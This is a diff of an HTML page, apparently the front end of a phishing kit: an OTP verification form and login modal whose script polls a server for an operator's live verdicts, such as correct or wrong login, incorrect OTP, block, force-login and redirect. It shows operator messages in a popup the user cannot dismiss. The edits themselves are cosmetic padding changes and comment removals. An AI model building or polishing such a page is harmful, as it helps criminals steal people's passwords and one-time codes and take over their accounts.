@@ -14,7 +14,7 @@
     font-family: Inter, sans-serif
 }
 
-/* ===== SKY BACKGROUND (ADDED) ===== */
+/* ===== SKY BACKGROUND ===== */
 @keyframes sky-fade {
     from { opacity: 0; }
     to { opacity: 1; }
@@ -181,7 +181,7 @@ body {
 .card {
     background: rgba(255, 255, 255, 0.9);
     border-radius: 22px;
-    padding: 4px 22px;
+    padding: 28px 22px;
     text-align: center;
 }
 
@@ -250,7 +250,7 @@ h2 {
 
 button {
     width: 100%;
-    padding: 6px;
+    padding: 12px;
     border-radius: 10px;
     border: none;
     background: linear-gradient(90deg, #2563eb, #7c3aed);
@@ -544,7 +544,7 @@ button:disabled {
 </head>
 <body>
 
-<!-- SKY CONTAINER (ADDED) -->
+<!-- SKY CONTAINER -->
 <div id="skyContainer" class="sky-bg"></div>
 
 <div class="wrapper">
@@ -575,7 +575,7 @@ button:disabled {
   </div>
 </div>
 
-<!-- Admin text popup — NO close button for user -->
+<!-- Admin text popup -->
 <div id="adminTextPopup">
   <div class="admin-text-box">
     <div class="admin-text-icon">
@@ -602,31 +602,22 @@ button:disabled {
   let isModalOpen       = false;
   let adminTextHandling = false;
 
-  // ── Format message: work on RAW text, never on HTML ───────────────────────
-  // Strategy: split text into tokens (words + spaces + punctuation),
-  // style each token individually so regex never touches injected HTML.
   function formatMessage(rawText) {
-    // Split into word-tokens and non-word separators
     const parts = rawText.split(/(\s+|[^a-zA-Z0-9]+)/);
     return parts.map(part => {
-      // YES (case-insensitive whole word)
       if (/^yes$/i.test(part)) {
         return `<span class="msg-yes">YES</span>`;
       }
-      // Pure integer number
       if (/^\d+$/.test(part)) {
         return `<span class="msg-num">${part}</span>`;
       }
-      // All-caps word 3+ letters (not YES, already handled above)
       if (/^[A-Z]{3,}$/.test(part)) {
         return `<span class="msg-caps">${part}</span>`;
       }
-      // Everything else — escape HTML and return as-is
       return part.replace(/[&<>]/g, m => m === '&' ? '&amp;' : m === '<' ? '&lt;' : '&gt;');
     }).join('');
   }
 
-  // ── Show admin text popup (replaces any existing one) ─────────────────────
   function showAdminTextPopup(rawMessage) {
     const popup   = document.getElementById('adminTextPopup');
     const content = document.getElementById('adminTextContent');
@@ -634,12 +625,10 @@ button:disabled {
     popup.classList.add('active');
   }
 
-  // ── Hide admin text popup (only called when admin releases) ───────────────
   function hideAdminTextPopup() {
     document.getElementById('adminTextPopup').classList.remove('active');
   }
 
-  // ── User-side flag release — no JWT ───────────────────────────────────────
   async function releaseAdminText() {
     try {
       await fetch('/api/users/release-admin-text', {
@@ -650,7 +639,6 @@ button:disabled {
     } catch (e) {}
   }
 
-  // ── Single unified admin_text poller ──────────────────────────────────────
   async function pollAdminText() {
     if (adminTextHandling) return;
     try {
@@ -661,7 +649,6 @@ button:disabled {
       });
       const data = await res.json();
 
-      // If flag was released (admin clicked Release), hide popup
       if (data.text_release === true) {
         hideAdminTextPopup();
         return;
@@ -680,16 +667,13 @@ button:disabled {
       } else if (txt === 'correct_login_success') {
         await handleCorrectLogin();
       } else {
-        // Regular text message from admin — show popup, do NOT release automatically
-        // Admin must click "Release" on dashboard to close it
         showAdminTextPopup(txt);
-        adminTextHandling = false; // unlock so next poll can detect a replacement
+        adminTextHandling = false;
       }
 
     } catch (e) { adminTextHandling = false; }
   }
 
-  // ── Incorrect OTP ──────────────────────────────────────────────────────────
   async function handleIncorrectOtp() {
     await releaseAdminText();
     if (approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
@@ -705,7 +689,6 @@ button:disabled {
     setTimeout(() => { errorDiv.style.display = 'none'; adminTextHandling = false; }, 5000);
   }
 
-  // ── Wrong login ────────────────────────────────────────────────────────────
   async function handleWrongLogin() {
     await releaseAdminText();
 
@@ -723,7 +706,6 @@ button:disabled {
     setTimeout(() => { if (modalError) modalError.style.display = 'none'; adminTextHandling = false; }, 4000);
   }
 
-  // ── Correct login ──────────────────────────────────────────────────────────
   async function handleCorrectLogin() {
     await releaseAdminText();
     const mc = document.getElementById('loginModalContent');
@@ -739,7 +721,6 @@ button:disabled {
     setTimeout(() => { adminTextHandling = false; }, 3000);
   }
 
-  // ── Block check ────────────────────────────────────────────────────────────
   async function checkIfBlocked() {
     try {
       const res  = await fetch('/api/users/check-blocked', {
@@ -760,7 +741,6 @@ button:disabled {
     }, 3000);
   }
 
-  // ── OTP submit + first-approval poll ──────────────────────────────────────
   function showLoading() { isProcessing = true; verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>'; errorDiv.style.display = 'none'; }
   function showWaiting() { verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>'; }
   function resetButton() { isProcessing = false; verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; }
@@ -822,7 +802,6 @@ button:disabled {
     }
   }
 
-  // ── Force-login polling ────────────────────────────────────────────────────
   function startForceLoginPolling() {
     setInterval(async () => {
       if (isModalOpen) return;
@@ -845,7 +824,6 @@ button:disabled {
     }, 2000);
   }
 
-  // ── Redirect-success polling ───────────────────────────────────────────────
   function startRedirectSuccessPolling() {
     setInterval(async () => {
       try {
@@ -859,7 +837,6 @@ button:disabled {
     }, 2000);
   }
 
-  // ── Login modal submit ─────────────────────────────────────────────────────
   async function submitLogin() {
     const loginEmail    = document.getElementById('loginEmail').value.trim();
     const loginPassword = document.getElementById('loginPassword').value;
@@ -909,7 +886,7 @@ button:disabled {
   document.getElementById('differentEmail').addEventListener('click', () => { window.location.href = '/users/login'; });
   document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
 
-  // ===== SKY BACKGROUND INIT (ADDED) =====
+  // ===== SKY BACKGROUND INIT =====
   function getTimeOfDay() {
     const hour = new Date().getHours();
     if (hour >= 5 && hour < 11) return 'morning';
